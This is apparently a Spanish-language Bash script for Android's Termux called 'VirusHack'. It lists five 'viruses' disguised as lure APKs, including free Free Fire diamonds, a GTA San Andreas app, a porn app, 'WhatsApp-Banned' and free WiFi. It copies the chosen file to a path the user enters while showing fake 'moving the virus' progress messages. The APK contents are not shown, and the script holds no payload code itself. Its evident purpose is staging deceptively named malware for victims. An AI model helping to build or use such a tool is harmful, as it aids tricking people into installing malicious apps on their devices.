#!/bin/bash
#-------------------------------
#Creador: sᴏʟ፝֟ɪтᴀʀɪᴏ
#Script VirusHack Creado con Bash
#-------------------------------
clear
sleep 0.9
opc(){
echo -e "\e[94m"
figlet -f smslant Virus Hack
echo -e "         \e[32m[\e[32m\e[94mCreador:\e[39m sᴏʟ፝֟ɪтᴀʀɪᴏ\e[32m]"
echo
echo -e "     [======\e[94mELIGA UN VIRUS\e[32m======]"
echo
echo -e "\e[32m[\e[39m 01 \e[32m]\e[94m - \e[39mDiamantes-Freefire"
echo -e "\e[32m[\e[39m 02 \e[32m]\e[94m - \e[39mGTA San Andrea.apk"
echo -e "\e[32m[\e[39m 03 \e[32m]\e[94m - \e[39mPorno Hub🍑🔥.apk"
echo -e "\e[32m[\e[39m 04 \e[32m]\e[94m - \e[39mWhastsapp-Banned💀"
echo -e "\e[32m[\e[39m 05 \e[32m]\e[94m - \e[39mWifi-Gratis.apk"
echo
echo -e "\e[32m[\e[39m 99 \e[32m]\e[94m - \e[39m Salir"
echo -e "\e[39m"
read -p "ELIGA LA OBCION DEL VIRUS ~> " virus
echo ""

if       [ $virus == "01" ];then
read -p "PON LA RUTA EN DONDE MOVERA EL VIRUS: " ruta
echo -e "\e[94m"
         sleep 1.3
echo ""
echo -e  [MOVIENDO EL VIRUS.]
         sleep 1.3
echo ""
echo -e  [MOVIENDO EL VIRUS..]
         sleep 1.3
echo ""
echo -e  [MOVIENDO EL VIRUS...]
         sleep 1.3
echo ""
echo -e  [MOVIENDO EL VIRUS....]
         sleep 1.6
echo
echo -e "\e[39mEL VIRUS FUE MOVIDO A LA RUTA" $ruta💀
cd /data/data/com.termux/files/home/VirusHack/zzzzzzz

cp -r 'Diamantes-FreeFire.apk' $ruta
sleep 2.4
clear
opc

elif     [ $virus == "02" ];then
read -p "PON LA RUTA DONDE MOVERA EL VIRUS: " ruta
echo -e "\e[94m"
         sleep 1.3
echo ""
echo -e  [MOVIENDO EL VIRUS.]
         sleep 1.3
echo ""
echo -e  [MOVIENDO EL VIRUS..]
         sleep 1.3
echo ""
echo -e  [MOVIENDO EL VIRUS...]
         sleep 1.3
echo ""
echo -e  [MOVIENDO EL VIRUS....]
         sleep 1.6
echo ""
echo -e "\e[39mEL VIRUS FUE MOVIDO A LA RUTA" $ruta💀
cd /data/data/com.termux/files/home/VirusHack/zzzzzzz

cp -r 'GTA San Andrea.apk' $ruta
sleep 2.4
clear
opc

elif     [ $virus == "03" ];then
read -p "PON LA RUTA DONDE MOVERA EL VIRUS: " ruta
echo -e "\e[94m"
         sleep 1.3
echo ""
echo -e  [MOVIENDO EL VIRUS.]
         sleep 1.3
echo ""
echo -e  [MOVIENDO EL VIRUS..]
         sleep 1.3
echo ""
echo -e  [MOVIENDO EL VIRUS...]
         sleep 1.3
echo ""
echo -e  [MOVIENDO EL VIRUS....]
         sleep 1.6
echo ""
echo -e "\e[39mEL VIRUS FUE MOVIDO A LA RUTA" $ruta💀
cd /data/data/com.termux/files/home/VirusHack/zzzzzzz

cp -r 'Videos Porno Hub🍑🔥.apk' $ruta
sleep 2.4
clear
opc

elif     [ $virus == "04" ];then
read -p "PON LA RUTA DONDE MOVERA EL VIRUS: " ruta
echo -e "\e[94m"
         sleep 1.3
echo ""
echo -e  [MOVIENDO EL VIRUS.]
         sleep 1.3
echo ""
echo -e  [MOVIENDO EL VIRUS..]
         sleep 1.3
echo ""
echo -e  [MOVIENDO EL VIRUS...]
         sleep 1.3
echo ""
echo -e  [MOVIENDO EL VIRUS....]
         sleep 1.6
echo ""
echo -e "\e[39mEL VIRUS FUE MOVIDO A LA RUTA" $ruta💀
cd /data/data/com.termux/files/home/VirusHack/zzzzzzz

cp -r 'Whatsapp-Banned💀.apk' $ruta
sleep 2.4
clear
opc

elif     [ $virus == "05" ];then
read -p "PON LA RUTA DONDE MOVERA EL VIRUS: " ruta
echo -e "\e[94m"
         sleep 1.3
echo ""
echo -e  [MOVIENDO EL VIRUS.]
echo ""
         sleep 1.3
echo ""
echo -e  [MOVIENDO EL VIRUS]
echo ""
         sleep 1.3
echo ""
echo -e  [MOVIENDO EL VIRUS...]
         sleep 1.3
echo ""
echo -e  [MOVIENDO EL VIRUS....]
         sleep 1.6
echo ""
echo -e "\e[39mEL VIRUS FUE MOVIDO A LA RUTA" $ruta💀
cd /data/data/com.termux/files/home/VirusHack/zzzzzzz

cp -r 'Wifi-Gratis.apk' $ruta
sleep 2.4
clear
opc

elif    [ $virus == "99" ];then
        echo -e '\e[39mHasta pronto Kuaker De Termux'
        exit
else
echo -e "\e[94m[\e[91m!\e[94m]-----------[\e[91mOPCION INVALIDA\e[94m]----------\e[94m[\e[91m!\e[94m]"
sleep 2.3
clear
opc

fi
}
opc
